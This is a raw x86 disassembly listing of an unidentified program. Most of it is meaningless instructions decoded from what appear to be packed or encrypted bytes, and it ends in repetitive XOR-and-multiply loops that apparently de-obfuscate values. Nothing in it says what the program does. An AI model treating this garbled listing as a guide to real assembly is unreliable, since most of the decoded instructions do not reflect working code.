  405863:	cs mov ebp,0xd1c6e8c0
  405869:	loopne 0x4058b7
  40586b:	aas    
  40586c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40586d:	cmc    
  40586e:	xlat   BYTE PTR ds:[ebx]
  40586f:	xchg   edx,eax
  405870:	xchg   ebp,eax
  405871:	cmp    ebx,edi
  405873:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405874:	je     0x405845
  405876:	retf   0x1f06
  405879:	jmp    0x4058eb
  40587b:	clc    
  40587c:	adc    al,0xb5
  40587e:	rcr    BYTE PTR [ecx-0x71956fff],cl
  405884:	sbb    DWORD PTR [eax+ebx*1],eax
  405887:	inc    esp
  405888:	rcr    BYTE PTR [esi-0x4d],cl
  40588b:	(bad)  
  40588d:	mov    ds:0xf034a26f,eax
  405892:	sahf   
  405893:	sbb    dl,BYTE PTR [ebp-0x71a5de78]
  405899:	or     bh,dl
  40589b:	jno    0x405862
  40589d:	(bad)  
  40589e:	mov    edx,0xb9600568
  4058a3:	(bad)  
  4058a4:	mov    ebp,0x1afd5910
  4058a9:	ins    BYTE PTR es:[edi],dx
  4058aa:	jmp    0x55e544fb
  4058af:	(bad)  
  4058b0:	in     al,0x2d
  4058b2:	lods   eax,DWORD PTR ds:[esi]
  4058b3:	mov    ah,0xd7
  4058b5:	mov    ?,WORD PTR [ebp+0x53]
  4058b8:	push   edx
  4058b9:	test   BYTE PTR [ebp+0x45],dl
  4058bc:	sub    ebx,DWORD PTR [ecx+0x42582606]
  4058c2:	(bad)  
  4058c3:	xchg   edi,eax
  4058c4:	pop    ds
  4058c5:	sti    
  4058c6:	xor    eax,DWORD PTR [edi+0x3e5b1066]
  4058cc:	cmp    DWORD PTR [esp+ebx*4],edi
  4058cf:	mov    ebx,0x90971a44
  4058d4:	mov    ch,0xe1
  4058d6:	call   0x871e5326
  4058db:	inc    esp
  4058dc:	loop   0x405880
  4058de:	xchg   ecx,eax
  4058df:	inc    esi
  4058e0:	shl    DWORD PTR cs:[ecx],1
  4058e3:	adc    eax,0x33be11d7
  4058e8:	pop    ebx
  4058e9:	jmp    0x4058ea
  4058eb:	retf   0x158c
  4058ee:	test   ebp,ecx
  4058f0:	fpatan 
  4058f2:	adc    BYTE PTR ds:0x8650ace0,bh
  4058f8:	fstp   QWORD PTR ds:0xc2893ca3
  4058fe:	xchg   ch,bh
  405900:	lahf   
  405901:	sar    BYTE PTR [edi-0x7f],cl
  405904:	pop    ss
  405905:	aas    
  405906:	fwait
  405907:	aaa    
  405908:	div    BYTE PTR [edx+0x43b3ce76]
  40590e:	mov    DWORD PTR [ebx-0x25],edi
  405911:	push   0x7063cd98
  405916:	and    DWORD PTR [esi+0x5690f5a5],ebx
  40591c:	sub    al,BYTE PTR [eax-0x8]
  40591f:	cmc    
  405920:	sbb    ebp,ebx
  405922:	mov    eax,ds:0x9e33925e
  405927:	imul   ecx,ebx,0xffffffe5
  40592a:	rcl    DWORD PTR [ecx+0x66b60e67],0x26
  405931:	adc    DWORD PTR [ebp+0x6b62c40c],edi
  405937:	call   0x86ba6ad1
  40593c:	ja     0x405976
  40593e:	mov    ds:0x2f33137b,eax
  405943:	imul   esi,DWORD PTR [ecx-0x3e],0x10415b5a
  40594a:	sbb    ebx,DWORD PTR [ebx+0x6e]
  40594d:	shl    dl,0xf5
  405950:	aam    0x2e
  405952:	or     ecx,ebp
  405954:	es pop ebx
  405956:	(bad)  
  405957:	mov    ecx,0xd35e0575
  40595c:	addr16 add dl,cl
  40595f:	xchg   ecx,eax
  405960:	imul   DWORD PTR [edx]
  405962:	ret    0xa4a
  405965:	shl    DWORD PTR [edi+0x5d],cl
  405968:	fisttp WORD PTR [esi]
  40596a:	dec    edi
  40596b:	inc    ecx
  40596c:	test   BYTE PTR [eax-0xd],ah
  40596f:	push   es
  405970:	loop   0x405997
  405972:	int    0x67
  405974:	pop    ebx
  405975:	cld    
  405976:	or     dh,BYTE PTR ds:0x174284eb
  40597c:	cli    
  40597d:	mov    ecx,0xa5b31757
  405982:	jb     0x405988
  405984:	push   ebp
  405985:	(bad)  
  405986:	cmp    bh,BYTE PTR [edx-0x59]
  405989:	loope  0x4059a5
  40598b:	xor    ch,bh
  40598d:	push   edx
  40598e:	and    eax,0x82873d31
  405993:	push   0x63ae8f13
  405998:	std    
  405999:	call   0x25c2:0x1cbbfbd8
  4059a0:	inc    edx
  4059a1:	xor    edi,DWORD PTR [eax-0x66]
  4059a4:	stc    
  4059a5:	inc    edx
  4059a6:	mov    edi,0x824c9b0e
  4059ab:	pop    ds
  4059ac:	call   0x854d:0xe0a3b09e
  4059b3:	stos   BYTE PTR es:[edi],al
  4059b4:	int    0x8f
  4059b6:	xchg   edi,eax
  4059b7:	(bad)  
  4059b8:	cmp    eax,ebx
  4059ba:	jg     0x405a23
  4059bc:	sub    DWORD PTR ds:[esi-0x58448f6d],edx
  4059c3:	xchg   edi,eax
  4059c4:	add    BYTE PTR [esi-0x72521ec3],dl
  4059ca:	xchg   ecx,eax
  4059cb:	mov    esp,0xa5d002f0
  4059d0:	fsubr  DWORD PTR [eax-0xca41836]
  4059d6:	dec    edx
  4059d7:	push   ebx
  4059d8:	sbb    DWORD PTR [ebx],0x4e
  4059db:	test   DWORD PTR [ebp+0x1],ecx
  4059de:	in     eax,0x65
  4059e0:	mov    esi,0x40b81884
  4059e5:	jl     0x4059d0
  4059e7:	das    
  4059e8:	xchg   BYTE PTR [ecx],ah
  4059ea:	mov    esi,0x20eb3d37
  4059ef:	xor    dl,bh
  4059f1:	push   cs
  4059f2:	push   ebx
  4059f3:	dec    ebp
  4059f4:	jbe    0x40599a
  4059f6:	hlt    
  4059f7:	adc    BYTE PTR [ebp-0x6f],bl
  4059fa:	cmp    ebx,DWORD PTR [esi+esi*1]
  4059fd:	sbb    al,0xc7
  4059ff:	lock cwde 
  405a01:	pop    es
  405a02:	std    
  405a03:	data16 jle 0x4059eb
  405a06:	cli    
  405a07:	mov    ecx,0x1b9c0c83
  405a0c:	test   al,0xb4
  405a0e:	jp     0x4059d9
  405a10:	cs ret 
  405a12:	add    edx,DWORD PTR [edi]
  405a14:	jge    0x405a59
  405a16:	arpl   ax,si
  405a18:	push   es
  405a19:	jns    0x4059b3
  405a1b:	jo     0x405a1b
  405a1d:	(bad)  
  405a1e:	jo     0x4059f1
  405a20:	retf   
  405a21:	jmp    0x50d1:0x6767d325
  405a28:	scas   eax,DWORD PTR es:[edi]
  405a29:	adc    ah,BYTE PTR [ecx+0x29]
  405a2c:	inc    ebp
  405a2d:	scas   eax,DWORD PTR es:[edi]
  405a2e:	sub    BYTE PTR [ebp+0x15bcfe8d],0x8
  405a35:	scas   eax,DWORD PTR es:[edi]
  405a36:	lock inc ecx
  405a38:	cli    
  405a39:	or     ebx,edi
  405a3b:	mov    bl,0x99
  405a3d:	cmp    ebp,edi
  405a3f:	retf   0x861f
  405a42:	mov    al,bh
  405a44:	inc    esp
  405a45:	inc    ebp
  405a46:	pop    edx
  405a47:	sbb    ebp,DWORD PTR [esi]
  405a49:	or     DWORD PTR [eax-0x5f],esp
  405a4c:	test   BYTE PTR ds:0x206a957a,dl
  405a52:	(bad)  [edx+0x19]
  405a55:	lods   al,BYTE PTR ds:[esi]
  405a56:	fist   WORD PTR [edx-0x21]
  405a59:	mov    al,ds:0x90b586f4
  405a5e:	data16 rcl BYTE PTR [edi-0x6d2ffc5c],1
  405a65:	out    0x5d,eax
  405a67:	and    al,0x93
  405a69:	sbb    eax,0xe369de6b
  405a6e:	fistp  QWORD PTR [esi-0x6f]
  405a71:	test   eax,0xe3bc2f7f
  405a76:	xor    al,0x18
  405a78:	jl     0x405aaf
  405a7a:	sub    BYTE PTR [edx+edx*4-0x3192074],cl
  405a81:	retf   
  405a82:	fs push ds
  405a84:	fidivr DWORD PTR [esi]
  405a86:	jnp    0x405a3b
  405a88:	test   eax,eax
  405a8a:	pusha  
  405a8b:	ja     0x405ad1
  405a8d:	adc    edi,edi
  405a8f:	fistp  DWORD PTR [edi+0x55f54814]
  405a95:	sub    cl,BYTE PTR [eax+ebp*8+0x6a]
  405a99:	out    dx,eax
  405a9a:	cmp    bh,ch
  405a9c:	or     dh,BYTE PTR [edi-0x19]
  405a9f:	fsub   QWORD PTR [esi+0x4adecc27]
  405aa5:	fscale 
  405aa7:	adc    dh,ah
  405aa9:	fs (bad) 
  405aab:	jp     0x405a4e
  405aad:	and    edi,DWORD PTR [ebp+0x57]
  405ab0:	adc    ah,BYTE PTR [ebx-0x6f]
  405ab3:	and    ecx,DWORD PTR [edi]
  405ab5:	aas    
  405ab6:	in     al,dx
  405ab7:	adc    al,0x6e
  405ab9:	or     edi,edi
  405abb:	add    DWORD PTR [ecx+0x165feb78],eax
  405ac1:	sbb    DWORD PTR [ebx+0x331b6a23],ebx
  405ac7:	je     0x405b16
  405ac9:	bound  ebp,QWORD PTR [eax+0x2cddd605]
  405acf:	jns    0x405ad4
  405ad1:	lods   eax,DWORD PTR ds:[esi]
  405ad2:	fs idiv ebx
  405ad5:	jg     0x405b3a
  405ad7:	adc    al,0x86
  405ad9:	int    0xad
  405adb:	imul   BYTE PTR [ebx]
  405add:	mov    edi,0x7ed3cd5d
  405ae2:	imul   esi,esi,0x14
  405ae5:	jle    0x405b0b
  405ae7:	push   esp
  405ae8:	xchg   esi,eax
  405ae9:	in     eax,0x2e
  405aeb:	ja     0x405b4f
  405aed:	ret    0xc40f
  405af0:	sbb    bl,al
  405af2:	aaa    
  405af3:	dec    edx
  405af4:	mov    eax,edi
  405af6:	sbb    BYTE PTR [edx+edi*1-0x360d02a5],bh
  405afd:	das    
  405afe:	mov    edx,0x57226135
  405b03:	xchg   esp,eax
  405b04:	sub    eax,0xd72d635d
  405b09:	adc    eax,0x8f1e4c41
  405b0e:	inc    esi
  405b0f:	pop    ecx
  405b10:	push   es
  405b11:	mov    bh,BYTE PTR [esi]
  405b13:	test   BYTE PTR [edx+0x61],cl
  405b16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b17:	in     al,dx
  405b18:	pop    ecx
  405b19:	mov    bl,0x30
  405b1b:	jbe    0x405b06
  405b1d:	aam    0x55
  405b1f:	xor    esp,DWORD PTR [ebx-0x32b0cdc2]
  405b25:	sti    
  405b26:	add    dh,dl
  405b28:	(bad)  
  405b2a:	jnp    0x405ae3
  405b2c:	sub    eax,0x3a33d08c
  405b31:	mov    cl,BYTE PTR [ebx-0x11ce8f5a]
  405b37:	add    ebp,DWORD PTR ds:0xbb64035e
  405b3d:	push   esi
  405b3e:	xor    ch,BYTE PTR [ebx-0x36]
  405b41:	and    bh,BYTE PTR [edi-0x58]
  405b44:	js     0x405b2e
  405b46:	pusha  
  405b47:	mov    ds:0xddf09e14,al
  405b4c:	xchg   edx,eax
  405b4d:	jmp    DWORD PTR ds:0xb2561ce5
  405b53:	or     al,0xa2
  405b55:	call   0xaf66:0x654332ff
  405b5c:	jmp    0xc260:0x3f7bde21
  405b63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b64:	push   0x1d97c3d2
  405b69:	into   
  405b6a:	dec    ebp
  405b6b:	sub    eax,0xb109e6bc
  405b70:	rcl    DWORD PTR [eax+0x15861dd3],cl
  405b76:	cmp    esp,ebp
  405b78:	les    esi,FWORD PTR [ebx+ebx*4+0x12]
  405b7c:	fs sub al,0x19
  405b7f:	push   eax
  405b80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b81:	sub    DWORD PTR [ebp+0x57d06c9c],edx
  405b87:	dec    esp
  405b88:	adc    edi,edx
  405b8a:	add    eax,0x2aa0b94
  405b8f:	outs   dx,BYTE PTR ds:[esi]
  405b90:	pop    edx
  405b91:	fidiv  WORD PTR ds:0x360511a4
  405b97:	ret    
  405b98:	cmp    BYTE PTR [edx],al
  405b9a:	xchg   esp,eax
  405b9b:	mov    bh,0xda
  405b9d:	jae    0x405b9a
  405b9f:	sahf   
  405ba0:	loopne 0x405c0b
  405ba2:	mov    dh,0x2a
  405ba4:	mov    dl,0x20
  405ba6:	cli    
  405ba7:	aam    0x7c
  405ba9:	sbb    al,0x6b
  405bab:	xor    edx,esp
  405bad:	mov    bh,0xa5
  405baf:	push   eax
  405bb0:	mov    ebx,0xb7150dbe
  405bb5:	ins    BYTE PTR es:[edi],dx
  405bb6:	pop    edi
  405bb7:	test   eax,0x67cf67a9
  405bbc:	popf   
  405bbd:	jp     0x405ba1
  405bbf:	xor    cl,0x60
  405bc2:	call   0xbb5f6590
  405bc7:	out    dx,eax
  405bc8:	push   ecx
  405bc9:	into   
  405bca:	je     0x405b91
  405bcc:	arpl   WORD PTR [ecx-0x344c6306],sp
  405bd2:	or     eax,0x4571e705
  405bd7:	mov    DWORD PTR [edx-0x48a1e713],ebp
  405bdd:	popa   
  405bde:	adc    al,0xaa
  405be0:	(bad)  
  405be3:	mov    ds:0x340d5c34,eax
  405be8:	xor    DWORD PTR [edx-0x4f],ecx
  405beb:	(bad)  
  405bec:	xchg   esi,eax
  405bed:	mov    eax,0xbed13ad6
  405bf2:	xchg   DWORD PTR cs:[ebp-0x66],ebp
  405bf6:	inc    ebp
  405bf7:	ja     0x405ba8
  405bf9:	pop    ebp
  405bfa:	xchg   ebx,eax
  405bfb:	(bad)  
  405bfd:	sar    DWORD PTR [ebx-0x7d8df351],0x32
  405c04:	mov    edx,0xe391c03b
  405c09:	and    DWORD PTR [ebp+0x58],edi
  405c0c:	push   ds
  405c0d:	iret   
  405c0e:	mov    al,ds:0xef53ce5a
  405c13:	or     DWORD PTR [eax-0x6e2b3d7f],edi
  405c19:	mov    al,ds:0x64a2f7fb
  405c1e:	inc    esp
  405c1f:	fdiv   st,st(7)
  405c21:	jl     0x405c0d
  405c23:	jmp    0xdace0f4b
  405c28:	jge    0x405bca
  405c2a:	clc    
  405c2b:	add    DWORD PTR [ebx],edx
  405c2d:	jle    0x405c94
  405c2f:	popa   
  405c30:	mov    al,ds:0x3dd24ad7
  405c35:	pop    eax
  405c36:	dec    ebx
  405c37:	ss xor al,0x3
  405c3a:	mov    ds:0xcf19819d,al
  405c3f:	out    dx,al
  405c40:	pop    es
  405c41:	mov    WORD PTR ds:0x40e78836,gs
  405c47:	mov    ch,al
  405c49:	ss mov bh,0xf4
  405c4c:	repnz aaa 
  405c4e:	js     0x405c9b
  405c50:	jb     0x405c5f
  405c52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c53:	xor    esp,DWORD PTR [edi]
  405c55:	shl    BYTE PTR ds:0x3096cb5f,1
  405c5b:	shr    ecx,0xc3
  405c5e:	aam    0xd1
  405c60:	mov    ds:0xf926c292,al
  405c65:	sbb    edx,edi
  405c67:	ja     0x405c75
  405c69:	dec    ecx
  405c6a:	faddp  st(5),st
  405c6c:	push   ebx
  405c6d:	sbb    eax,0xde10307
  405c72:	dec    ecx
  405c73:	adc    edx,DWORD PTR [edi+0x6129675d]
  405c79:	jns    0x405c99
  405c7b:	mov    eax,0x39c40295
  405c80:	mov    fs,WORD PTR [ebp-0x7e1b01a7]
  405c86:	xchg   ebp,esp
  405c88:	dec    ecx
  405c89:	adc    DWORD PTR [esi-0x5b],edi
  405c8c:	sbb    ebp,ebx
  405c8e:	mov    edx,0xf38e5f7a
  405c93:	ret    0xc2c9
  405c96:	ja     0x405c7d
  405c98:	add    eax,0xf6b4cd5b
  405c9d:	mov    esi,0xfe3549f0
  405ca2:	arpl   WORD PTR [ecx-0x2a],dx
  405ca5:	add    BYTE PTR ds:0xa978752,bh
  405cab:	jp     0x405c8e
  405cad:	lea    edi,[edx-0x4f]
  405cb0:	jge    0x405d01
  405cb2:	jp     0x405cab
  405cb4:	and    DWORD PTR [esi],ebp
  405cb6:	mov    bl,0x71
  405cb8:	lock rol DWORD PTR [esi+eax*1+0x586d7c48],cl
  405cc0:	repnz (bad) 
  405cc2:	push   esp
  405cc3:	push   edi
  405cc4:	ss lock cwde 
  405cc7:	fstp   QWORD PTR [edx-0x7d4a831b]
  405ccd:	lahf   
  405cce:	ss mov ah,0x34
  405cd1:	daa    
  405cd2:	mov    al,0xb7
  405cd4:	ja     0x405c7e
  405cd6:	cwde   
  405cd7:	(bad)  
  405cd9:	in     al,0x5
  405cdb:	pushf  
  405cdc:	mov    DWORD PTR [esi-0xf],edi
  405cdf:	out    0xe9,al
  405ce1:	fcmovnb st,st(6)
  405ce3:	xchg   ebx,eax
  405ce4:	scas   eax,DWORD PTR es:[edi]
  405ce5:	pushf  
  405ce6:	push   ecx
  405ce7:	cmp    DWORD PTR [edi-0x30],esi
  405cea:	dec    eax
  405ceb:	aam    0xbb
  405ced:	sub    edi,DWORD PTR [edx+0x43]
  405cf0:	ret    0xeeb3
  405cf3:	shl    esp,1
  405cf5:	retf   0x99bc
  405cf8:	xchg   ecx,eax
  405cf9:	aad    0x34
  405cfb:	nop
  405cfc:	cmp    al,0xde
  405cfe:	ja     0x405c83
  405d00:	iret   
  405d01:	mov    al,ds:0x72570d5e
  405d06:	cdq    
  405d07:	lahf   
  405d08:	stc    
  405d09:	adc    DWORD PTR [ebx+edx*1-0x3f],esp
  405d0d:	loopne 0x405d14
  405d0f:	cmp    eax,edx
  405d11:	inc    edi
  405d12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d13:	imul   eax,esi,0x43f259ed
  405d19:	mov    ds:0x64951a87,al
  405d1e:	jns    0x405d7f
  405d20:	(bad)  
  405d21:	mov    WORD PTR [ebx+edx*2+0x78d851c1],fs
  405d28:	std    
  405d29:	add    ecx,ebp
  405d2b:	sub    edx,ebp
  405d2d:	cmp    dh,BYTE PTR [edx]
  405d2f:	call   0x29:0xc4fa8549
  405d36:	or     dl,BYTE PTR [ebp+0x79]
  405d39:	leave  
  405d3a:	mov    ebp,0xadaf95f0
  405d3f:	fcom   QWORD PTR [edi]
  405d41:	ret    
  405d42:	repnz in eax,dx
  405d44:	ss push cs
  405d46:	inc    ecx
  405d47:	ret    
  405d48:	out    dx,eax
  405d49:	sahf   
  405d4a:	mov    ch,0xdf
  405d4c:	bound  ebp,QWORD PTR [ebx]
  405d4e:	cdq    
  405d4f:	add    esi,edx
  405d51:	outs   dx,BYTE PTR ds:[esi]
  405d52:	cmp    bl,BYTE PTR [edi+0x61]
  405d55:	cli    
  405d56:	shl    DWORD PTR [ebx],cl
  405d58:	mov    eax,ds:0xac04ae5f
  405d5d:	cmc    
  405d5e:	aas    
  405d5f:	int    0x1a
  405d61:	jmp    0x5939e9cd
  405d66:	jge    0x405d2c
  405d68:	std    
  405d69:	push   0xffffff82
  405d6b:	dec    edx
  405d6c:	(bad)  
  405d6d:	jg     0x405cf4
  405d6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d70:	ins    BYTE PTR es:[edi],dx
  405d71:	ret    0xb6b9
  405d74:	add    cl,BYTE PTR [edx+0xa]
  405d77:	pop    ecx
  405d78:	push   0x3afff8a1
  405d7d:	gs aas 
  405d7f:	cmp    edx,DWORD PTR ds:0xefad03ac
  405d85:	cmp    DWORD PTR [edx+0x3520c12d],esi
  405d8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d8c:	xor    eax,0xd186a7ee
  405d91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d92:	push   ss
  405d93:	fstp   QWORD PTR [ebx+ecx*8]
  405d96:	loope  0x405d41
  405d98:	sub    DWORD PTR [ebx-0x58f8cb50],0xffffffd4
  405d9f:	inc    ecx
  405da0:	cmp    BYTE PTR [edi*2-0x2e18d217],dl
  405da7:	cmp    al,BYTE PTR ds:0x478a6674
  405dad:	mov    eax,0xc91d3bac
  405db2:	pushf  
  405db3:	mov    dh,BYTE PTR [edx]
  405db5:	mov    ecx,0xee5fb04c
  405dba:	loope  0x405e1c
  405dbc:	imul   esp,esp,0x73518e58
  405dc2:	push   cs
  405dc3:	xchg   esi,eax
  405dc4:	pop    esi
  405dc5:	pop    ss
  405dc6:	xchg   ebx,eax
  405dc7:	inc    esi
  405dc8:	pop    esi
  405dc9:	jg     0x405dff
  405dcb:	xchg   ebx,eax
  405dcc:	jl     0x405db4
  405dce:	cmc    
  405dcf:	jnp    0x405d6f
  405dd1:	adc    al,0xec
  405dd3:	or     BYTE PTR [esi+0x71ed8d91],dh
  405dd9:	fdivr  st,st(7)
  405ddb:	pop    eax
  405ddc:	lods   eax,DWORD PTR ds:[esi]
  405ddd:	aad    0x65
  405ddf:	pop    eax
  405de0:	xchg   ecx,eax
  405de1:	mov    edi,0xf674f01f
  405de6:	inc    edi
  405de7:	int3   
  405de8:	jnp    0x405e42
  405dea:	mov    cl,0xa6
  405dec:	retf   0x3ada
  405def:	sub    eax,0xa46abe87
  405df4:	pusha  
  405df5:	imul   esp,ebp,0xffffffba
  405df8:	(bad)  
  405df9:	sbb    BYTE PTR [ecx],bh
  405dfb:	mov    DWORD PTR [eax],esi
  405dfd:	cmp    eax,esp
  405dff:	xchg   ecx,eax
  405e00:	ins    DWORD PTR es:[edi],dx
  405e01:	inc    edx
  405e02:	rcl    BYTE PTR [ebp-0x32],1
  405e05:	test   al,0xbc
  405e07:	pop    ds
  405e08:	inc    edx
  405e09:	push   ebp
  405e0a:	call   0xb225:0x39bb1c35
  405e11:	mov    bl,0x2c
  405e13:	sbb    eax,0x2f99d011
  405e18:	in     eax,0x15
  405e1a:	push   eax
  405e1b:	jno    0x405e17
  405e1d:	and    BYTE PTR [ebx+0x7d],dh
  405e20:	rol    BYTE PTR [ebp+0x63],0x49
  405e24:	or     bl,BYTE PTR [eax]
  405e26:	popa   
  405e27:	sub    ebp,ecx
  405e29:	aaa    
  405e2a:	dec    ebx
  405e2b:	shr    eax,1
  405e2d:	pusha  
  405e2e:	iret   
  405e2f:	aad    0x6d
  405e31:	int3   
  405e32:	mov    esi,0xccb4cb4e
  405e37:	mov    esi,0x9078e157
  405e3c:	in     al,dx
  405e3d:	sbb    al,0xfa
  405e3f:	pop    ds
  405e40:	inc    edi
  405e41:	jp     0x405e14
  405e43:	jg     0x405e53
  405e45:	inc    ecx
  405e46:	xor    ebx,DWORD PTR [edx-0x25]
  405e49:	xchg   esp,eax
  405e4a:	int3   
  405e4b:	mov    ah,0xc
  405e4d:	(bad)  
  405e4e:	xlat   BYTE PTR ds:[ebx]
  405e4f:	adc    ebp,esi
  405e51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e52:	sub    ebp,eax
  405e54:	push   DWORD PTR [edx-0x10]
  405e57:	jo     0x405e00
  405e59:	lea    ebp,[esi]
  405e5b:	rcr    DWORD PTR gs:[ecx-0x170b1406],cl
  405e62:	add    DWORD PTR [edi],edx
  405e64:	fldenv [esi]
  405e66:	inc    esi
  405e67:	js     0x405e49
  405e69:	xor    DWORD PTR [ecx+0x34],esi
  405e6c:	inc    edi
  405e6d:	cmp    al,0x4a
  405e6f:	inc    edi
  405e70:	inc    ecx
  405e71:	sub    bl,BYTE PTR [eax-0x36cbb9be]
  405e77:	and    DWORD PTR [esi+0x5f],eax
  405e7a:	in     eax,dx
  405e7b:	fsubr  QWORD PTR [ebx+0x49]
  405e7e:	xor    DWORD PTR [ebp-0x44dff1b0],edx
  405e84:	jnp    0x405ecc
  405e86:	call   0xf250:0x671410f8
  405e8d:	dec    edi
  405e8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e8f:	mov    dh,BYTE PTR [eax]
  405e91:	stos   DWORD PTR es:[edi],eax
  405e92:	push   edi
  405e93:	adc    ah,0x7a
  405e96:	xchg   ecx,eax
  405e97:	loope  0x405e6b
  405e99:	cmp    DWORD PTR [esi+edi*2-0x55],edi
  405e9d:	push   eax
  405e9e:	mov    bl,0x6e
  405ea0:	clc    
  405ea1:	es dec ebp
  405ea3:	xchg   DWORD PTR [ebx+0x3f],ebp
  405ea6:	rcl    BYTE PTR [edi],0xca
  405ea9:	cmp    eax,0x1bcb5d82
  405eae:	cmp    DWORD PTR [eax+0x4424b6f7],ebp
  405eb4:	push   ecx
  405eb5:	dec    eax
  405eb6:	mov    bh,0x46
  405eb8:	and    BYTE PTR [ebp-0x15],ch
  405ebb:	and    DWORD PTR ds:0x4748bd68,0x2b5b505e
  405ec5:	adc    eax,0x460ca793
  405eca:	dec    ebx
  405ecb:	cli    
  405ecc:	mov    al,0x57
  405ece:	jl     0x405ecf
  405ed0:	bound  esp,QWORD PTR [edx+ecx*4]
  405ed3:	imul   eax,ecx,0x7f142b2e
  405ed9:	lds    ecx,FWORD PTR [eax]
  405edb:	stos   DWORD PTR es:[edi],eax
  405edc:	push   edi
  405edd:	xchg   ebx,eax
  405ede:	pop    es
  405edf:	xchg   esp,eax
  405ee0:	pop    edx
  405ee1:	daa    
  405ee2:	stos   DWORD PTR es:[edi],eax
  405ee3:	mov    ecx,0x66cbec1b
  405ee8:	mov    dh,0x4a
  405eea:	out    dx,al
  405eeb:	cld    
  405eec:	mov    WORD PTR [ebx-0x3c],gs
  405eef:	sar    DWORD PTR [ebp+0x5f4efcc5],1
  405ef5:	push   ds
  405ef6:	imul   edx,DWORD PTR [ecx-0x9],0x265de9c
  405efd:	int3   
  405efe:	pop    ebx
  405eff:	in     eax,dx
  405f00:	adc    eax,0x5c34b8d
  405f05:	je     0x405f13
  405f07:	pusha  
  405f08:	mov    cl,0xdf
  405f0a:	push   0x7b8fb7d1
  405f0f:	into   
  405f10:	test   eax,eax
  405f12:	repnz clc 
  405f14:	cmp    edi,DWORD PTR [eax-0x47]
  405f17:	adc    dl,ch
  405f19:	cli    
  405f1a:	mov    ecx,0xc584e2e3
  405f1f:	jp     0x405f78
  405f21:	outs   dx,DWORD PTR ds:[esi]
  405f22:	xchg   esi,eax
  405f23:	mov    bh,0xcf
  405f25:	xchg   ebx,eax
  405f26:	pusha  
  405f27:	xchg   edx,eax
  405f28:	cdq    
  405f29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f2a:	ret    0x294a
  405f2d:	imul   ebx,DWORD PTR [edi+0x8558bc8],0xff41d033
  405f37:	inc    ebp
  405f38:	call   0xca7c3540
  405f3d:	jb     0x403b83
  405f43:	jmp    0x405f8d
  405f48:	mov    ecx,DWORD PTR [ebp-0xc]
  405f4b:	mov    DWORD PTR [ebp+0x8],ecx
  405f4e:	jmp    0x405f80
  405f53:	mov    ecx,DWORD PTR [ebp+0x8]
  405f56:	mov    edx,DWORD PTR [ebp-0x8]
  405f59:	xor    ecx,eax
  405f5b:	xor    edx,eax
  405f5d:	sub    ecx,edx
  405f5f:	sub    ecx,esi
  405f61:	xor    ecx,eax
  405f63:	mov    DWORD PTR [ebp+0x8],ecx
  405f66:	mov    ecx,DWORD PTR [ebp+0x8]
  405f69:	mov    edx,DWORD PTR [ebp+0x8]
  405f6c:	imul   edx,edx,0x5708f5
  405f72:	xor    ecx,eax
  405f74:	add    ecx,esi
  405f76:	lea    ecx,[ebp+ecx*4-0x64]
  405f7a:	mov    edi,DWORD PTR [ecx]
  405f7c:	add    edx,edi
  405f7e:	mov    DWORD PTR [ecx],edx
  405f80:	mov    ecx,DWORD PTR [ebp+0x8]
  405f83:	xor    ecx,eax
  405f85:	add    ecx,esi
  405f87:	jne    0x405f53
  405f8d:	mov    ecx,DWORD PTR [ebp-0xc]
  405f90:	mov    DWORD PTR [ebp+0x8],ecx
  405f93:	jmp    0x405fc5
  405f98:	mov    ecx,DWORD PTR [ebp+0x8]
  405f9b:	mov    edx,DWORD PTR [ebp-0x8]
  405f9e:	xor    ecx,eax
  405fa0:	xor    edx,eax
  405fa2:	sub    ecx,edx
  405fa4:	sub    ecx,esi
  405fa6:	xor    ecx,eax
  405fa8:	mov    DWORD PTR [ebp+0x8],ecx
  405fab:	mov    ecx,DWORD PTR [ebp+0x8]
  405fae:	mov    edx,DWORD PTR [ebp+0x8]
  405fb1:	imul   edx,edx,0x5708f5
  405fb7:	xor    ecx,eax
  405fb9:	add    ecx,esi
  405fbb:	lea    ecx,[ebp+ecx*4-0x64]
  405fbf:	mov    edi,DWORD PTR [ecx]
  405fc1:	add    edx,edi
  405fc3:	mov    DWORD PTR [ecx],edx
  405fc5:	mov    ecx,DWORD PTR [ebp+0x8]
  405fc8:	xor    ecx,eax
  405fca:	add    ecx,esi
  405fcc:	jne    0x405f98
  405fd2:	mov    ecx,DWORD PTR [ebp-0x8]
  405fd5:	mov    edx,DWORD PTR [ebp-0x20]
  405fd8:	xor    ecx,eax
  405fda:	lea    ecx,[ecx+edx*1+0x3272db]
  405fe1:	mov    DWORD PTR [ebp-0x20],ecx
  405fe4:	inc    DWORD PTR [ebp+0xc]
  405fe7:	mov    ecx,DWORD PTR [ebp-0x1c]
  405fea:	xor    ecx,eax
  405fec:	add    ecx,esi
  405fee:	jne    0x401627
  405ff4:	jmp    0x40607d
  405ff9:	mov    ecx,DWORD PTR [ebp-0xc]
  405ffc:	mov    DWORD PTR [ebp+0x8],ecx
  405fff:	jmp    0x406031
  406004:	mov    ecx,DWORD PTR [ebp+0x8]
  406007:	mov    edx,DWORD PTR [ebp-0x8]
  40600a:	xor    ecx,eax
  40600c:	xor    edx,eax
  40600e:	sub    ecx,edx
  406010:	sub    ecx,esi
  406012:	xor    ecx,eax
  406014:	mov    DWORD PTR [ebp+0x8],ecx
  406017:	mov    ecx,DWORD PTR [ebp+0x8]
  40601a:	mov    edx,DWORD PTR [ebp+0x8]
  40601d:	imul   edx,edx,0x5708f5
  406023:	xor    ecx,eax
  406025:	add    ecx,esi
  406027:	lea    ecx,[ebp+ecx*4-0x64]
  40602b:	mov    edi,DWORD PTR [ecx]
  40602d:	add    edx,edi
  40602f:	mov    DWORD PTR [ecx],edx
  406031:	mov    ecx,DWORD PTR [ebp+0x8]
